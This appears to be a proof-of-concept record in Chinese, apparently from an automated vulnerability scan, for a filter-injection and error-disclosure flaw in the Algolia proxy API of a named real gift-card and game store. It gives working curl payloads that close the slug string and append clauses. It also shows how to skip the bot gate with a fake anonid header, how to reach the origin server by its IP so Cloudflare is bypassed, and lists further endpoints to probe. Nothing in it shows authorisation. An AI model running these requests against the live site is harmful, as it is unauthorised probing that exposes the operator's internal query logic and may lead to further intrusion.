# 礼品卡电商 /api/algolia/get-hits-by-slugs：slugs 未转义拼入 Algolia filters DSL（服务端查询注入 + 报错回显内部 filter 模板与 app id）

- **code**: herkou-shop-api-algolia-get-hits-by-slugs-filter-dsl-injecti
- **kind**: poc
- **category**: sqli
- **component**: Algolia（应用自建 /api/algolia/get-hits-by-slugs 代理接口，托管于 Heroku）
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Windows + curl（$ARTEX_UA）在 fanatical.com 的 admin/www 同一 Heroku 应用上实测：① 基线 GET /api/algolia/get-hits-by-slugs?slugs=x → HTTP/2 200 {"allSlugs":["x"],"hits":[],"nbHits":0,"nbPages":0,"page":1,"hitsPerPage":36}（证明 slugs 作为字符串塞进 slug 过滤）；② 注入 GET ...?slugs=x%22)%20OR%20(disabled%20%3D%201 → HTTP/2 400 {"hits":[],"count":0,"err":{"name":"ApiError","message":"filters: Not allowed incomplete string at col 27","transporterStackTrace":[{"request":{"data":"{\"query\":\"\",\"filters\":\"(slug:\\\"x\\\") OR (disabled = 1\\\" )  AND disabled = 0 AND available_valid_from <= 1794407843 AND (available_valid_until = 0 OR available_valid_until > 1794407843)\",\"facetFilters\":[\"included_regions:GB\"],..."。攻击者子句 (disabled = 1) 出现在服务端最终 filters 表达式中，且响应完整回显内部 filter 模板、facetFilters 与 Algolia app id（api-key 脱敏）→ 确认为真实服务端查询注入 + 报错信息泄露。源站直连（--noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45）与经 CF 同 payload 回显一致，证明非 CF 拦截页、CF 未拦此 payload。
- **path**: pocs/herkou-shop-api-algolia-get-hits-by-slugs-filter-dsl-injecti/poc.http
- **tags**: algolia,filter-injection,query-injection,api,info-leak,error-disclosure,heroku,cloudflare,catalog,no-sql,query-parameter-validation
- **created_at**: 2026-11-11T14:40:55.622Z
- **engine**: admin.fanatical.com / www.fanatical.com
- **found_by**: vuln-scan

## 描述

礼品卡/游戏电商站点自建的 Algolia 代理接口把 slugs 查询参数原样拼接进 Algolia search 的 filters 表达式（模板 `(slug:"<slugs>" ) AND disabled = 0 AND available_valid_from <= <T> AND (available_valid_until = 0 OR available_valid_until > <T>)`）。传入含 `"` 的值即可闭合字符串字面量并追加任意 filter 子句，触发 Algolia ApiError；错误响应把拼接后的最终 filters、facetFilters、内部阈值 T 与 Algolia app id 全量回显（api-key 被脱敏），构成服务端查询注入 + 报错信息泄露。属"非 SQL 的查询 DSL 注入"面：参数校验缺失导致结构化查询语句被污染。适用面：任何把用户参数用字符串拼接方式喂给 Algolia filters 的代理接口（自建 /api/algolia/* 层）。当前深度受 Algolia DSL 约束，只泄露公开商品目录与内部查询逻辑/业务开关。

## 用法

```
前置：接口走应用层 bot 门禁，需带任意值 anonid 头（如 anonid: 11111111-1111-4111-8111-111111111111）；admin.<host> 与 www.<host> 是同一 Heroku 应用（www 侧经 Cloudflare Worker 转发到同一后端），两边该接口行为一致。

【基线（先跑，确认参数被当字符串而不是被拒）】
curl -sk -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  'https://www.<host>/api/algolia/get-hits-by-slugs?slugs=x'
期望：HTTP/2 200 {"allSlugs":["x"],"hits":[],"nbHits":0,"nbPages":0,"page":1,"hitsPerPage":36}

【注入（闭合 slug:" 字符串字面量 + 追加子句）】
# 经 CF / 正常域名路径
curl -sk -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  'https://www.<host>/api/algolia/get-hits-by-slugs?slugs=x%22)%20OR%20(disabled%20%3D%201'
# URL 解码后：slugs=x") OR (disabled = 1

# 源站直连（绕过 CF，验证不是 CF 拦截页）
curl -sk --noproxy '*' --resolve admin.<host>:443:<ORIGIN_IP> \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  'https://admin.<host>/api/algolia/get-hits-by-slugs?slugs=x%22)%20OR%20(disabled%20%3D%201'

判据（成立 = 注入确认）：
HTTP/2 400
{"hits":[],"count":0,"err":{"name":"ApiError","message":"filters: Not allowed incomplete string at col 27",
 "transporterStackTrace":[{"request":{"data":"{\"query\":\"\",\"filters\":\"(slug:\\\"x\\\") OR (disabled = 1\\\" )  AND disabled = 0 AND available_valid_from <= 1794407843 AND (available_valid_until = 0 OR available_valid_until > 1794407843)\",\"facetFilters\":[\"included_regions:GB\"],...
关键三点：① slug:"x" 被你的 `"` 闭合；② 你的子句 (disabled = 1) 出现在服务端最终 filters 里；③ 响应回显完整内部 filter 模板、facetFilters（region facet）与 Algolia app id。

失败/常见原因：
- 无 anonid 头或值非法 → 被应用层 bot 门禁挡住，返回中继/人机页而非 ApiError。
- 经 CF 若返回 CF 挑战页 → 先用 --noproxy '*' --resolve 直连源站确认，别误判成"被 WAF 拦=不存在"。
- 若只看到 400 但响应体里没有 filters 回显 → 说明该站点错误处理已收敛（不再回显 transducer 栈），注入仍可能存在但只剩布尔/计数差分可判。

局限（已实测边界，别浪费包）：
- Algolia 同一 OR 内不允许混不同类型 → 无法跨 slug（字符串）/数值类型做 OR 绕过；
- 尾部 AND disabled = 0 与 available_valid_from/until 时间窗门槛删不掉 → 当前只能读公开商品目录 + 内部查询逻辑/业务开关，未取得订单/礼卡/后台数据。
下一步深挖方向：换其他 /api/algolia/* 代理端点（subscribeProducts / search 类）试同类拼接；尝试 facetFilters 或 page/hitsPerPage 参数是否也未校验。
```

## 正文

```
# 礼品卡电商 /api/algolia/get-hits-by-slugs — slugs 未转义拼入 Algolia filters DSL

## 0. 一句话
自建 Algolia 代理接口把 `slugs` 查询参数**字符串拼接**进 Algolia `filters` 表达式。
传 `"` 闭合 `slug:"..."` 字面量即可污染服务端查询；Algolia ApiError 的响应体把**最终 filters、facetFilters、内部时间阈值、Algolia app id 全量回显**（api-key 脱敏）。
= 服务端查询注入 + 报错信息泄露。属 query parameter validation（非 SQL 的查询 DSL 注入）。

## 1. 目标与入口
- 应用：礼品卡/游戏电商站点（www 主站 + admin 同源应用），托管于 Heroku。
- 入口：`GET /api/algolia/get-hits-by-slugs?slugs=<payload>`
  - `https://www.<host>/api/algolia/get-hits-by-slugs`（经 Cloudflare Worker 转发到同一 Heroku 后端）
  - `https://admin.<host>/api/algolia/get-hits-by-slugs`（同应用，源站直连）
- 服务端拼出的 filters 模板（由报错回显还原）：
  ```
  (slug:"<slugs>" )  AND disabled = 0 AND available_valid_from <= <T> AND (available_valid_until = 0 OR available_valid_until > <T>)
  ```
  另有 `facetFilters: ["included_regions:GB"]`（region facet）。
- 前置门禁：需带任意值的 `anonid` 头（例：`anonid: 11111111-1111-4111-8111-111111111111`）绕过应用层 bot 判定。

## 2. 基线（先跑，确认参数被当字符串而非被拒）
```bash
curl -sk -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  'https://www.<host>/api/algolia/get-hits-by-slugs?slugs=x'
```
回显：
```
HTTP/2 200
{"allSlugs":["x"],"hits":[],"nbHits":0,"nbPages":0,"page":1,"hitsPerPage":36}
```
说明：`x` 被塞进 `slug:"x"` 做过滤，服务端正常返回结构化结果。

## 3. 注入验证
payload（URL 解码后）：`slugs=x") OR (disabled = 1`

```bash
# 3.1 经 CF / 正常域名路径
curl -sk -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  'https://www.<host>/api/algolia/get-hits-by-slugs?slugs=x%22)%20OR%20(disabled%20%3D%201'

# 3.2 源站直连（绕 CF，排除"只是 CF 拦截页"）
curl -sk --noproxy '*' --resolve admin.<host>:443:<ORIGIN_IP> \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  'https://admin.<host>/api/algolia/get-hits-by-slugs?slugs=x%22)%20OR%20(disabled%20%3D%201'
```

两条路径回显一致：
```
HTTP/2 400
{"hits":[],"count":0,"err":{
  "name":"ApiError",
  "message":"filters: Not allowed incomplete string at col 27",
  "transporterStackTrace":[{"request":{"data":"{\"query\":\"\",
     \"filters\":\"(slug:\\\"x\\\") OR (disabled = 1\\\" )  AND disabled = 0 AND available_valid_from <= 1794407843 AND (available_valid_until = 0 OR available_valid_until > 1794407843)\",
     \"facetFilters\":[\"included_regions:GB\"],...
```

## 4. 判据（三点同时成立即确认注入）
1. `slug:"x"` 被攻击者的 `"` 闭合 → 报错为 `Not allowed incomplete string`。
2. 攻击者子句 `(disabled = 1)` 出现在服务端最终 `filters` 字符串里（回显可读）。
3. 响应体回显**完整内部 filter 模板 + facetFilters（region facet）+ 内部时间阈值 T + Algolia app id**（api-key 被脱敏）→ 报错信息泄露。

> 同一 payload 经 CF 与源站直连均触发同一 ApiError ⇒ 不是 CF 拦截页，是真实后端行为；CF 不拦该 payload。

## 5. 失败 / 常见原因
- 无 `anonid` 头或值非法 → 被应用层 bot 门禁挡住，得到人机/中继页，看不到 ApiError。
- 经 CF 返回 CF 挑战页 → 改用 `--noproxy '*' --resolve` 直连源站复验，别把 WAF 拦截误判为"不存在"。
- 400 但响应体无 filters 回显 → 该站点错误处理已收敛；注入可能仍在，但只能靠布尔/计数差分判定。

## 6. 已实测边界（别浪费包）
- Algolia **同一 OR 内不允许混不同类型** ⇒ 无法跨 slug（字符串）/数值类型 OR 绕过。
- 尾部 `AND disabled = 0` 与 `available_valid_from/until` 时间窗门槛**删不掉**（注入点在 AND 链首段）。
- 因此当前可达：**公开商品目录读取 + 内部查询逻辑/业务开关（disabled、region facet、时间窗）泄露**；
  **未取得**订单 / 礼卡 / 后台数据。

## 7. 复用 / 深挖方向
- 同类站点常见同族端点：`/api/algolia/*`（subscribeProducts、search、get-hits-by-slugs 等）——逐个试同一 payload。
- 试 `facetFilters`（region）、`page`、`hitsPerPage` 等参数是否同样未校验（可能直接放行结构化注入）。
- 若能在 filters 里塞入自身商品的 slug 精确命中，可作为"注入确实改变了服务端查询语义"的强证据（而非仅报错）。

## 8. 来源
- 任务：task#3（fanatical.com 礼品卡站点全流程），finding_id 59。
- 验证时间：2026-11-11，本机 Windows + curl，源站直连用 `--noproxy '*'`（故未进平台流量库，证据以命令回显为准）。

```
